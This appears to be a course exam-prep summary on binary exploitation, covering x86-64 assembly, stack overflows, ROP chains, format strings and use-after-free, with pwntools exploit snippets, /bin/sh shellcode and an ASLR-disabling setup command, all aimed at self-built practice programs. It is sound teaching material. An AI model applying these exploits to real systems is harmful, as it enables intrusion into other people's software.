# üéØ IDATT2503 Exploitation & Hacking - Complete Summary

## What You Now Have

### Theory Guides (1-9)
‚úÖ Classical Ciphers, RSA, MAC/Hash, AES, Buffer Overflow, Web Vulnerabilities, Fuzzing, Pentest Methodology, Security Practices

### **NEW** Practical Exploitation Guides (10-12)
‚úÖ **Guide 10**: x86-64 Assembly basics - registers, instructions, stack, ROP gadgets, shellcode
‚úÖ **Guide 11**: 5 vulnerable programs with complete exploit scripts and GDB debugging
‚úÖ **Guide 12**: How to create your own vulnerable programs for practice
‚úÖ **Bonus**: Complete command reference for exploitation tools

---

## üîß Setup Your Hacking Lab (15 minutes)

```bash
# 1. Install tools
sudo apt update
sudo apt install -y build-essential gdb python3 python3-pip

# 2. Install pwntools (Python exploitation library)
pip3 install pwntools

# 3. Install pwndbg (makes GDB 100x better)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 4. Install ROPgadget (find ROP gadgets)
pip3 install ROPgadget

# 5. Disable ASLR for practice
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Done! You're ready to hack
```

---

## üìö Learning Path for Exploitation

### Week 1: Assembly Fundamentals
**Read: Guide 10 - Assembly Basics**

**Key Topics:**
- Registers (RAX, RDI, RSI, RBP, RSP, RIP)
- Instructions (mov, push, pop, call, ret, jmp)
- Stack layout (grows down, function frames)
- Calling convention (RDI, RSI, RDX for args)

**Practice:**
```bash
# Read disassembly
objdump -d /bin/ls | head -50

# Analyze in GDB
gdb /bin/ls
(gdb) disassemble main
(gdb) x/10i main
```

**Quiz Yourself:**
- What register holds the 1st function argument? (RDI)
- What register holds the return value? (RAX)
- What instruction returns from a function? (ret)
- How much does RSP change with push? (-8 bytes)

---

### Week 2: Basic Exploitation
**Read: Guide 11 - Exploitation Practice**

**Program 1: vuln1.c - Basic Stack Overflow**

1. **Compile:**
```bash
gcc -fno-stack-protector -z execstack -no-pie vuln1.c -o vuln1
```

2. **Analyze:**
```bash
checksec vuln1  # No protections
./vuln1 AAAA    # Normal run
```

3. **Find offset in GDB:**
```bash
gdb ./vuln1
(gdb) run $(python3 -c 'from pwn import *; print(cyclic(200))')
# Crashes at 0x6161616X
(gdb) quit

python3 -c 'from pwn import *; print(cyclic_find(0x61616162))'
# Returns offset (probably 72)
```

4. **Exploit:**
```python
from pwn import *

elf = ELF('./vuln1')
win = elf.symbols['win']

payload = b'A' * 72
payload += p64(win)

p = process(['./vuln1', payload])
p.interactive()
# You get a shell!
```

5. **Understand Why It Works:**
```
Stack before overflow:
[buffer: 64 bytes] [saved RBP: 8 bytes] [return address: 8 bytes]

Stack after overflow:
[AAAA...72 bytes] [win address: 8 bytes]

When function returns:
- ret instruction pops return address from stack
- RIP = win address
- Program jumps to win()
- Shell spawned!
```

---

### Week 3: ROP Chains
**Read: Guide 11 - vuln3.c (ROP Challenge)**

**Why ROP?**
- NX (No eXecute) protection prevents shellcode on stack
- Can't inject code, must reuse existing code
- ROP = Return-Oriented Programming

**How ROP Works:**
```
Normal return:
[ret instruction] ‚Üí pop RIP ‚Üí jump to function

ROP chain:
[ret] ‚Üí gadget1 (pop rdi; ret)
      ‚Üí gadget2 (pop rsi; ret)  
      ‚Üí function (system)

Each 'ret' loads next address from stack
```

**Example: Call system("/bin/sh")**

1. **Find gadgets:**
```bash
ROPgadget --binary ./vuln3 | grep "pop rdi"
# 0x401234: pop rdi; ret
```

2. **Find /bin/sh:**
```python
from pwn import *
elf = ELF('./vuln3')
binsh = next(elf.search(b'/bin/sh'))
print(hex(binsh))
```

3. **Build chain:**
```python
payload = b'A' * offset
payload += p64(0x401234)      # pop rdi; ret
payload += p64(binsh)         # "/bin/sh" address
payload += p64(system_plt)    # system()
```

4. **Execution flow:**
```
1. Overflow returns to pop_rdi gadget
2. pop rdi ‚Üí RDI = binsh address
3. ret loads next address (system)
4. system() called with RDI = "/bin/sh"
5. Shell!
```

---

### Week 4: Advanced Techniques

**Format Strings (vuln2.c):**
```python
# Leak stack values
payload = b'%p ' * 10

# Read specific address
payload = p64(target_addr) + b'%7$s'

# Write to address
payload = p64(target_addr) + b'%100x%7$n'
```

**Use-After-Free (vuln5.c):**
```c
Object *obj1 = malloc(sizeof(Object));
free(obj1);
Object *obj2 = malloc(sizeof(Object));  // Reuses obj1's memory
obj1->func();  // Actually calls obj2's function!
```

**Integer Overflow (vuln4.c):**
```c
unsigned int size = 0xFFFFFFFF;  // Wraps to huge value
if (size > 100) { return; }      // Check passes!
memcpy(buffer, data, size);      // Copies way more than 100!
```

---

## üîç Debugging Skills

### Essential GDB Workflow

```bash
# 1. Load program
gdb ./vuln

# 2. Set breakpoint at vulnerable function
(gdb) break vulnerable
(gdb) run $(python3 -c 'print("A"*100)')

# 3. Examine stack BEFORE overflow
(gdb) x/20x $rsp
# See clean stack

# 4. Step through strcpy
(gdb) next

# 5. Examine stack AFTER overflow
(gdb) x/20x $rsp
# See 0x4141414141... everywhere

# 6. Check return address location
(gdb) x/gx $rbp+8
# 0x4141414141414141 (we control this!)

# 7. Continue to crash
(gdb) continue
# Program crashes trying to jump to 0x4141...

# Success! We control RIP
```

### Reading Assembly in GDB

```assembly
(gdb) disassemble vulnerable

0x401180:  push   rbp              # Save old base pointer
0x401181:  mov    rbp,rsp          # Set new base pointer
0x401184:  sub    rsp,0x50         # Allocate 80 bytes
0x401188:  lea    rax,[rbp-0x40]   # buffer address (RBP-64)
0x40118c:  mov    rdi,rax          # 1st arg to strcpy
0x40118f:  call   strcpy           # VULNERABLE!
0x401194:  leave                   # Restore stack
0x401195:  ret                     # Return (we control this!)
```

**What you need to know:**
- `sub rsp,0x50` ‚Üí 80 bytes allocated
- `[rbp-0x40]` ‚Üí buffer at RBP-64
- Return address at `[RBP+8]`
- Offset: 64 (buffer) + 8 (saved RBP) = 72 bytes

---

## üíª Practice Exercises

### Exercise 1: Modify Buffer Size
**Task:** Change vuln1.c buffer from 64 to 32 bytes
```c
char buffer[32];  // Changed from 64
```
- Recompile
- Find new offset (should be 40 instead of 72)
- Update exploit
- Verify it works

### Exercise 2: Add Another Function
**Task:** Add second target function
```c
void secret() {
    printf("Secret function!\n");
    printf("Flag: flag{found_secret}\n");
}
```
- Exploit to call `secret()` instead of `win()`
- Prove you can call any function

### Exercise 3: ROP Chain to Multiple Functions
**Task:** Call printf() then system()
```python
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(hello_str)
payload += p64(printf_plt)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
```

### Exercise 4: Leak Stack Canary
**Task:** Compile with canary, leak it with format string
```bash
gcc vuln.c -o vuln  # Has canary
```
```python
# Leak canary at offset N
p.sendline(b'%N$p')
canary = int(p.recv(), 16)

# Use canary in overflow
payload = b'A' * 64
payload += p64(canary)  # Correct canary
payload += b'A' * 8     # Saved RBP
payload += p64(win)     # Return address
```

---

## üéØ Exam-Relevant Skills

### What Exam Might Ask:

**1. "What is the offset to the return address?"**
```
Answer approach:
- Buffer size: 64 bytes
- Saved RBP: 8 bytes  
- Total offset: 72 bytes
```

**2. "What does this assembly do?"**
```assembly
xor rax, rax
push rax
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
```
**Answer:** Pushes "/bin/sh" onto stack, sets RDI to point to it (syscall setup)

**3. "How does ROP bypass NX?"**
**Answer:** "ROP uses existing code (gadgets) instead of injecting shellcode. By chaining short instruction sequences ending in 'ret', attacker controls execution flow without executing stack data. Each gadget sets up registers or performs operations, and 'ret' loads the next gadget address from the (writable) stack. This allows arbitrary code execution while respecting NX protection."

**4. "Explain stack layout during buffer overflow"**
```
[Low addresses]
    Local variables (buffer)
    Saved RBP
    Return address ‚Üê overflow target
    Function arguments
[High addresses]

Overflow direction: upward (toward return address)
```

**5. "What registers hold function arguments?"**
**Answer:** 
```
1st: RDI
2nd: RSI
3rd: RDX
4th: RCX
5th: R8
6th: R9
More: Stack
```

---

## üìñ Resources in This Package

### Guides
1. ‚úÖ Assembly basics (registers, instructions, stack)
2. ‚úÖ 5 vulnerable programs with exploits
3. ‚úÖ Creating your own challenges
4. ‚úÖ Complete command reference

### Vulnerable Programs
- **vuln1.c** - Basic overflow ‚Üí call win()
- **vuln2.c** - Format string ‚Üí leak memory
- **vuln3.c** - ROP chain ‚Üí system("/bin/sh")
- **vuln4.c** - Integer overflow ‚Üí buffer overflow
- **vuln5.c** - Use-after-free ‚Üí function pointer hijack

### All source code provided, ready to compile!

---

## üöÄ Quick Start (Right Now!)

```bash
# 1. Create working directory
mkdir ~/exploit-practice
cd ~/exploit-practice

# 2. Copy vuln1.c from Guide 11 into vuln1.c

# 3. Compile
gcc -fno-stack-protector -z execstack -no-pie vuln1.c -o vuln1

# 4. Test normal execution
./vuln1 "Hello"

# 5. Test crash
./vuln1 "$(python3 -c 'print("A"*100)')"
# Segmentation fault (good!)

# 6. Find offset in GDB
gdb ./vuln1
(gdb) run $(python3 -c 'from pwn import *; print(cyclic(200))')
# Note the crash address
(gdb) quit

# 7. Create exploit.py from Guide 11

# 8. Run exploit
python3 exploit.py
# You should get a shell!

# 9. Celebrate! üéâ
```

---

## üí° Pro Tips

1. **Always check protections first:**
   ```bash
   checksec ./binary
   ```

2. **Use pwntools for everything:**
   ```python
   from pwn import *  # One import, all tools
   ```

3. **Verify in GDB before scripting:**
   ```bash
   gdb ./binary
   # Test manually first
   ```

4. **Pattern generation is your friend:**
   ```python
   cyclic(200)  # Generate
   cyclic -l 0x61616162  # Find offset
   ```

5. **Stack alignment matters:**
   - Sometimes need extra `ret` before function
   - Add `p64(ret_gadget)` if segfault

---

## üìã Checklist Before Exam

- [ ] Understand x86-64 registers (RAX, RDI, RSI, RBP, RSP, RIP)
- [ ] Can read simple assembly (mov, push, pop, call, ret)
- [ ] Know stack layout (buffer ‚Üí saved RBP ‚Üí return address)
- [ ] Can calculate overflow offset (buffer size + 8)
- [ ] Understand ROP chains (gadgets + ret)
- [ ] Know calling convention (RDI, RSI, RDX for args)
- [ ] Can identify vulnerabilities in C code
- [ ] Exploited at least 3 programs successfully
- [ ] Debugged exploits in GDB
- [ ] Understand protection mechanisms (canary, NX, ASLR, PIE)

---

## üéì You're Ready When...

‚úÖ You can look at C code and spot buffer overflow
‚úÖ You can calculate offset without GDB
‚úÖ You can read assembly and understand what it does
‚úÖ You can explain how ROP bypasses NX
‚úÖ You can write a basic exploit in 5 minutes
‚úÖ You know what `pop rdi; ret` does
‚úÖ You understand why stack grows down
‚úÖ You can debug exploits in GDB

**Now go practice! Compile the programs and hack them! üöÄ**

---

[‚Üê Back to Main Guide](../EXAM-PREP-README.md)
